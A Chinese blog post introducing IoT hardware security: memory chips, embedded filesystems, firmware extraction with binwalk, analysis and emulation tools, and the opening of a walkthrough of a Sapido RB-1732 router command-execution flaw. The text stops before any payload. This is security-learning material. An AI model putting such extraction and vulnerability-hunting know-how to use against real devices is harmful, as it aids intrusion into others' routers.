<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>硬件安全初探-理论入门 | The Blog of Monoceros406</title><meta name="author" content="Monoceros406"><meta name="copyright" content="Monoceros406"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="硬件安全初探-理论入门存储芯片只读存储器ROM只能读取事先存储的数据，无法改变或删除。数据不会因电源关闭而消失，分为PROM、EPROM、EEPROM、FLASHROME。 可编程只读存储器PROM，可用专用编程器将数据写入，但只有一次写入机会，写入后无法修改，写入时出错则只能报废。 可擦除可编程只读存储器EPROM，可重复擦除和写入。其正面陶瓷封装上有个玻璃窗口，用紫外线照射窗口内部集成电路可擦">
<meta property="og:type" content="article">
<meta property="og:title" content="硬件安全初探-理论入门">
<meta property="og:url" content="http://monoceros.github.io/2024/09/20/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%9D%E6%8E%A2-%E7%90%86%E8%AE%BA%E5%85%A5%E9%97%A8/index.html">
<meta property="og:site_name" content="The Blog of Monoceros406">
<meta property="og:description" content="硬件安全初探-理论入门存储芯片只读存储器ROM只能读取事先存储的数据，无法改变或删除。数据不会因电源关闭而消失，分为PROM、EPROM、EEPROM、FLASHROME。 可编程只读存储器PROM，可用专用编程器将数据写入，但只有一次写入机会，写入后无法修改，写入时出错则只能报废。 可擦除可编程只读存储器EPROM，可重复擦除和写入。其正面陶瓷封装上有个玻璃窗口，用紫外线照射窗口内部集成电路可擦">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://monoceros.github.io/img/avatar.jpg">
<meta property="article:published_time" content="2024-09-20T07:35:36.000Z">
<meta property="article:modified_time" content="2024-10-20T11:12:52.092Z">
<meta property="article:author" content="Monoceros406">
<meta property="article:tag" content="IOT">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://monoceros.github.io/img/avatar.jpg"><link rel="shortcut icon" href="/img/avatar.jpg"><link rel="canonical" href="http://monoceros.github.io/2024/09/20/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%9D%E6%8E%A2-%E7%90%86%E8%AE%BA%E5%85%A5%E9%97%A8/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '硬件安全初探-理论入门',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-10-20 19:12:52'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">291</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">24</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://t.alcy.cc/ycy')"><nav id="nav"><span id="blog-info"><a href="/" title="The Blog of Monoceros406"><span class="site-name">The Blog of Monoceros406</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">硬件安全初探-理论入门</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-09-20T07:35:36.000Z" title="发表于 2024-09-20 15:35:36">2024-09-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-10-20T11:12:52.092Z" title="更新于 2024-10-20 19:12:52">2024-10-20</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="硬件安全初探-理论入门"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="硬件安全初探-理论入门"><a href="#硬件安全初探-理论入门" class="headerlink" title="硬件安全初探-理论入门"></a>硬件安全初探-理论入门</h1><h2 id="存储芯片"><a href="#存储芯片" class="headerlink" title="存储芯片"></a>存储芯片</h2><p>只读存储器ROM只能读取事先存储的数据，无法改变或删除。数据不会因电源关闭而消失，分为PROM、EPROM、EEPROM、FLASHROME。</p>
<p>可编程只读存储器PROM，可用专用编程器将数据写入，但只有一次写入机会，写入后无法修改，写入时出错则只能报废。</p>
<p>可擦除可编程只读存储器EPROM，可重复擦除和写入。其正面陶瓷封装上有个玻璃窗口，用紫外线照射窗口内部集成电路可擦除，也可用EPROM擦除器。老式计算机BIOS使用EPROM，擦除窗口用BIOS发行商、版本和声明标签覆盖。</p>
<p>电擦除可编程只读存储器EEPROM，通过电子信号修改内容，最小修改单位为字节。</p>
<p>快闪存储器FLASHROM（闪存），允许多次擦除写入，是EEPROM的一种，还可快速读取数据，常用于一般性资料存储，以及计算机和其他数字产品间交换信息。闪存分为NOR闪存和NAND闪存。NOR闪存的特点是芯片内执行XIP，这样应用程序可直接在闪存内运行，不必把代码读到系统RAM中。NOR闪存传输效率很高，但写入和擦除速率很低。NAND闪存提供极高的单元密度，即存储密度高，写入和擦除速度很快，但需要特殊系统接口进行管理。闪存保存信息不需要消耗电力，且与硬盘相比有更佳的抗震性，广泛应用于移动设备。</p>
<h2 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h2><p>SquashFS是一套供Linux内核使用的只读压缩文件系统，成本低。在使用NAND闪存作为存储介质的嵌入式设备中，使用SquashFS的前提是内核要支持MTD字符设备和块设备。SquashFS适用于长时间开机且对稳定性要求高的系统，物联网设备大多采用SquashFS。</p>
<p>JFFS2是一种基于闪存存储介质的日志文件系统。JFFS2在闪存介质上存在两种类型的结构，有jffs2_raw_inode和jffs2_raw_dirent。前置包含文件管理数据，后者描述文件在文件系统中的位置。真正的数据存储在jffs2_raw_inode节点后面，大部分管理数据都在系统挂载后建立的。这两种类型的结构有公共的文件头结构jffs2_unknown_node，该结构中有一个jint32_t类型的hdr_crc变量，代表文件头部中其他字段的CRC循环冗余校验值。JFFS2是一种日志结构的文件系统，不论电源以何种方式在何时停止供电，它都能保持数据完整性。当系统突然断电而重启时，JFFS2自动将系统恢复到断电前最后一个稳定状态，该稳定状态后发生的任何改变都无法恢复。JFFS2针对闪存设备提供掉电保护，使得用户可以安全地读写数据，无需数据因断点而造成损坏或丢失。</p>
<p>YAFFS2是目前唯一一个专门为NAND闪存设计的文件系统，采用类日志结构，结合NAND闪存特点来提供掉电保护机制，有效避免意外掉电对文件系统一致性和完整性的影响。YAFFS2用独立的日志文件来跟踪文件系统内容的变化。YAFFS2支持页面大小为2KB（大页）的NAND内存。</p>
<p>UBIFS无序区块镜像文件系统主要用在闪存设备中，与Linux任何传统文件系统Ext2、XFS、JFS等完全不同，是一类单独的文件系统。UBIFS通过无序区块镜像UBI子系统处理与MTD设备之间的交互。UBIFS支持回写，即修改后的文件不是立刻提交到闪存介质上，而是先将这些修改缓存起来，达到写入条件后再回写到闪存介质中。</p>
<p>CramFS文件系统是专门针对闪存设计的只读压缩的文件系统。系统需要访问某个位置的数据时，马上计算出该数据在CramFS中的位置，并将其解压到RAM中，通过内存访问获取数据。</p>
<h2 id="文件系统提取"><a href="#文件系统提取" class="headerlink" title="文件系统提取"></a>文件系统提取</h2><p>不同文件系统有不同的签名：</p>
<table>
<thead>
<tr>
<th>文件系统</th>
<th>签名</th>
</tr>
</thead>
<tbody><tr>
<td>SquashFS</td>
<td>sqsh、hsqs、sqlz、qshs、hsqt、shsq</td>
</tr>
<tr>
<td>YAFFS</td>
<td>\x03\x00\x00\x00\x01、\x00\x00\x00\xFF\xFF</td>
</tr>
<tr>
<td>CramFS</td>
<td>0x28cd3d45</td>
</tr>
<tr>
<td>JFFS2</td>
<td>0x1985</td>
</tr>
<tr>
<td>MemFS</td>
<td>owowowowowowowowo、wowowowowowow</td>
</tr>
<tr>
<td>ROMFS</td>
<td>-rom1fs-\0</td>
</tr>
<tr>
<td>Ext2&#x2F;Ext3</td>
<td>0xEF53</td>
</tr>
</tbody></table>
<p>对于SquashFS，sqsh和hsqs分别表示标准大、小端文件系统，sqlz表示使用LZMA算法压缩过的大端文件系统，qshs时3.3版本使用LZMA压缩过的大端文件系统，hsqt时DD-WRT固件常用的小端文件系统，shsq时D-Link路由器常用的小端文件系统。LZMA时Defalt算法和LZ77算法改良优化后的压缩算法，DD-WRT是一个基于Linux的无线路由软件，可用于某些无线路由器的非商业第三方固件。</p>
<p>例如提取D-Link路由器中SquashFS文件系统，检索签名：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexdump -C iot.bin | grep <span class="string">&quot;sqsh\|hsqs\|sqlz\|qshs\|tqsh\|hsqt\|shsq&quot;</span></span><br></pre></td></tr></table></figure>

<p>这里在0x001d02a4处检索到hsqs，对应十进制1901220，提取：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=iot.bin bs=1 skip=1901220 of=iot1</span><br></pre></td></tr></table></figure>

<p>检查解压出来的文件系统是否正确：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file iot1</span><br></pre></td></tr></table></figure>

<p>再提取出整个文件系统，提取的文件夹名为squashfs-root：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unsquashfs iot1</span><br></pre></td></tr></table></figure>

<p>上面方法麻烦了，也可以用binwalk一把嗦：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me iot.bin</span><br></pre></td></tr></table></figure>

<p>提取的文件夹名为_iot.bin.extracted，里面squashfs-root文件夹即为获取的文件系统。</p>
<h2 id="文件系统分析"><a href="#文件系统分析" class="headerlink" title="文件系统分析"></a>文件系统分析</h2><p>firmwalker可检查文件系统目录，找出包含passwd、pwd等敏感字符的文件，并输出到firmwalker.txt目录下。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./firmwalker.sh squashfs-root/</span><br></pre></td></tr></table></figure>

<p>trommel比firmwalker收集到的信息能更多些，输出结果为.&#x2F;result.json，这个最好使建议用这个：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 trommel.py -p squashfs-root -o result.json -d ./</span><br></pre></td></tr></table></figure>

<p>emba可对已提取的基于Linux的固件进行分析，识别具有较大威胁的固件文件，列出二进制危险函数，检索CVE漏洞库，将结果输出到“822log.log文件中”。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./emba.sh -l 822log.<span class="built_in">log</span> -f squashfs-root/</span><br></pre></td></tr></table></figure>

<p>FACT固件分析比较工具是一款具有Web界面的自动化固件测试平台，可自动分析固件并以图形的形式展示分析结果。</p>
<h2 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h2><h3 id="QEMU"><a href="#QEMU" class="headerlink" title="QEMU"></a>QEMU</h3><p>安装QEMU：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install qemu-system qemu-user-static bridge-utils</span><br></pre></td></tr></table></figure>

<p>先得获取对应架构：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file ./bin/busybox <span class="comment">#这里演示为32-bit MSB MIPS</span></span><br></pre></td></tr></table></figure>

<p>物联网设备处理器架构主要有ARM和MIPS两种，其中mips为大端模式MIPS架构，mipsel为小端模式MIPS架构。在用户模式下使用QEMU进行固件模拟时，先将QEMU在&#x2F;usr&#x2F;bin目录下对应的二进制运行文件考到squashfs-root目录下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp $(which qemu-mips-static) ./</span><br></pre></td></tr></table></figure>

<p>模拟运行固件中&#x2F;bin&#x2F;busybox：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">chroot</span> ./ ./qemu-mips-static ./bin/busybox</span><br></pre></td></tr></table></figure>

<p>上述为QEMU的用户模式模拟，下面是QEMU怎样在系统模式下模拟。此时需要为QEMU指定内核镜像、IDE硬盘镜像、内核参数，这些需要到<a target="_blank" rel="noopener" href="https://people.debian.org/~aurel32/qemu/">Debian官网</a>上下载，如这里32-bit MSB MIPS架构需要下载debian_wheezy_mips_standard.qcow2和vmlinux-3.2.0-4-4kc-malta俩文件。模拟之前应先在主机上配置虚拟网卡，供QEMU虚拟机与主机交互，命令如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo ip tuntap add dev tap0 mode tap user `<span class="built_in">whoami</span>`</span><br><span class="line">sudo ifconfig tap0 10.10.10.1/24</span><br><span class="line">ifconfig tap0</span><br></pre></td></tr></table></figure>

<p>启动命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-mips -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mips_standard.qcow2 -append <span class="string">&quot;root=/dev/sda1 console=tty0&quot;</span> -net nic -net tap,ifname=tap0</span><br></pre></td></tr></table></figure>

<p>算了也不知道为啥QEMU加上网卡参数就挂死了，不加能成功模拟但没法与主机交互。这小节先搁着。</p>
<h3 id="FirmAE"><a href="#FirmAE" class="headerlink" title="FirmAE"></a>FirmAE</h3><p>千万得把Python给hold一下，这玩意apt滚到3.12后pip不让用了，啥安装脚本都库库报错。我找来了FirmAE安好的环境，大家各显神通吧。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">blonet@blonet:~/桌面/FirmAE$ sudo ./run.sh --<span class="built_in">help</span> <span class="comment">#查看帮助</span></span><br><span class="line">[sudo] blonet 的密码： </span><br><span class="line">Usage: ./run.sh [mode]... [brand] [firmware|firmware_directory]</span><br><span class="line">mode: use one option at once</span><br><span class="line">      -r, --run     : run mode         - run emulation (no quit)</span><br><span class="line">      -c, --check   : check mode       - check network reachable and web access (quit)</span><br><span class="line">      -a, --analyze : analyze mode     - analyze vulnerability (quit)</span><br><span class="line">      -d, --debug   : debug mode       - debugging emulation (no quit)</span><br><span class="line">      -b, --boot    : boot debug mode  - kernel boot debugging using QEMU (no quit)</span><br></pre></td></tr></table></figure>

<p>模拟执行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">blonet@blonet:~/桌面/FirmAE$ sudo ./run.sh -r us-ac9v1 ./US_AC9V1.0BR_V15.03.2.10_multi_TD01.bin <span class="comment">#-r后跟上厂商名 应该能随便写</span></span><br><span class="line">[sudo] blonet 的密码： </span><br><span class="line">[*] ./US_AC9V1.0BR_V15.03.2.10_multi_TD01.bin emulation start!!!</span><br><span class="line">[*] extract <span class="keyword">done</span>!!!</span><br><span class="line">[*] get architecture <span class="keyword">done</span>!!!</span><br><span class="line">[*] ./US_AC9V1.0BR_V15.03.2.10_multi_TD01.bin already succeed emulation!!!</span><br><span class="line"></span><br><span class="line">[IID] 1</span><br><span class="line">[MODE] run</span><br><span class="line">[+] Network reachable on 192.168.0.1!</span><br><span class="line">[+] Web service on 192.168.0.1</span><br><span class="line">Creating TAP device tap1_0...</span><br><span class="line">Set <span class="string">&#x27;tap1_0&#x27;</span> persistent and owned by uid 0</span><br><span class="line">Bringing up TAP device...</span><br><span class="line">Starting emulation of firmware... 192.168.0.1 <span class="literal">true</span> <span class="literal">true</span> 2.113973243 4.184737600 <span class="comment">#一般卡在这儿 完全运行起来可能得几个小时</span></span><br><span class="line"></span><br><span class="line">blonet@blonet:~/桌面/FirmAE$ sudo ./run.sh -r dlink ./2023.03.01-23.37_DIR_882_MT7621AT_4.0.1_nightly.bin</span><br><span class="line">[*] ./2023.03.01-23.37_DIR_882_MT7621AT_4.0.1_nightly.bin emulation start!!!</span><br><span class="line">[*] extract <span class="keyword">done</span>!!!</span><br><span class="line">[*] get architecture <span class="keyword">done</span>!!!</span><br><span class="line">mke2fs 1.46.5 (30-Dec-2021)</span><br><span class="line">e2fsck 1.46.5 (30-Dec-2021)</span><br><span class="line">[*] infer network start!!! <span class="comment">#还可能卡在这儿 具体下面是啥我也不知道:(</span></span><br></pre></td></tr></table></figure>

<h3 id="Firmware-Analysis-Toolkit"><a href="#Firmware-Analysis-Toolkit" class="headerlink" title="Firmware Analysis Toolkit"></a>Firmware Analysis Toolkit</h3><p>这玩意儿安装脚本先更新Python，得注意一下了，要不装不上。</p>
<h2 id="固件解密"><a href="#固件解密" class="headerlink" title="固件解密"></a>固件解密</h2><p>大多数厂商可呢给你会对固件进行加密处理，这种情况下有三种情况。</p>
<p>第一种：设备固件在出厂时未加密也未包含任何解密程序。解密程序与未加密版本的新固件一起提供，此后发布的固件为加密固件。此时可获取解密程序来解密加密固件，然后进行更新。</p>
<p>第二种：设备固件在原始版本中进行了加密，厂商更改加密方案并发布一个未加密的新固件，其中包含新版本解密程序。更新固件前，先看新固件版本的发布通告，该通告只是用户在将固件升级到最新版本之前，需先升级到固件的一个中间版本，该中间版本为未加密的固件版本，通过该中间版本的固件进行性升级，可最终获取新版本加密固件的解密程序。</p>
<p>第三种：从网上下载的设备固件在原始版本中进行了加密，此时很难获得解密程序，只能用设备提取固件中文件系统。</p>
<p>当binwalk时发现无法提取文件系统，则查看熵值：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk binwalk DIR852_FW100CNb09.bin -E</span><br></pre></td></tr></table></figure>

<p>若恒定在1左右，可能对固件不同部分进行了加密。PHP文件一般存储在_DIR852_FW100CNb09.bin.extracted&#x2F;squashfs-root&#x2F;etc&#x2F;templates&#x2F;hnap&#x2F;中。</p>
<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><h3 id="Sapido-RB-1732-路由器命令执行漏洞"><a href="#Sapido-RB-1732-路由器命令执行漏洞" class="headerlink" title="Sapido RB-1732 路由器命令执行漏洞"></a>Sapido RB-1732 路由器命令执行漏洞</h3><p>固件下载：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1Gj9RDlAQdCDiaLdLzQ2Aag?pwd=8381%E6%88%96https://share.weiyun.com/RjicYRKE%E3%80%82">https://pan.baidu.com/s/1Gj9RDlAQdCDiaLdLzQ2Aag?pwd=8381或https://share.weiyun.com/RjicYRKE。</a></p>
<p>Sapido是SAPIDO公司开发的一款家用路由器，其RB-1732系列的v2.0.43之前的固件版本存在命令执行漏洞。</p>
<p>材料：RB-1732_EN_v2.0.26.bin</p>
<p>先提取，可以看到文件系统为SquashFS。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">blonet@blonet:~/桌面/CTF-Workbench$ binwalk RB-1732_TC_v2.0.43.bin -Me</span><br><span class="line"></span><br><span class="line">Scan Time:     2024-10-16 19:27:28</span><br><span class="line">Target File:   /home/blonet/桌面/CTF-Workbench/RB-1732_TC_v2.0.43.bin</span><br><span class="line">MD5 Checksum:  27b91f4216466031eaa7b039a7717b93</span><br><span class="line">Signatures:    411</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">24207         0x5E8F          LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 3410896 bytes</span><br><span class="line">1004185       0xF5299         Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 5705880 bytes, 1361 inodes, blocksize: 131072 bytes, created: 2038-02-10 09:21:04</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Scan Time:     2024-10-16 19:27:29</span><br><span class="line">Target File:   /home/blonet/桌面/CTF-Workbench/_RB-1732_TC_v2.0.43.bin.extracted/5E8F</span><br><span class="line">MD5 Checksum:  cf81f813aa695140d701f8a042a1a610</span><br><span class="line">Signatures:    411</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">1212600       0x1280B8        Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 31</span><br><span class="line">2818464       0x2B01A0        Linux kernel version 2.6.30</span><br><span class="line">2854064       0x2B8CB0        CRC32 polynomial table, little endian</span><br><span class="line">2943479       0x2CE9F7        HTML document header</span><br><span class="line">2943642       0x2CEA9A        HTML document footer</span><br><span class="line">3232608       0x315360        AES S-Box</span><br></pre></td></tr></table></figure>

<p>该漏洞存在文件syscmd.asp中，那就搜一下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">blonet@blonet:~/桌面/CTF-Workbench$ find ./ -name <span class="string">&quot;syscmd.asp&quot;</span></span><br><span class="line">./_RB-1732_TC_v2.0.43.bin.extracted/squashfs-root/web/syscmd.asp</span><br></pre></td></tr></table></figure>

<p>看到syscmd.asp中：</p>
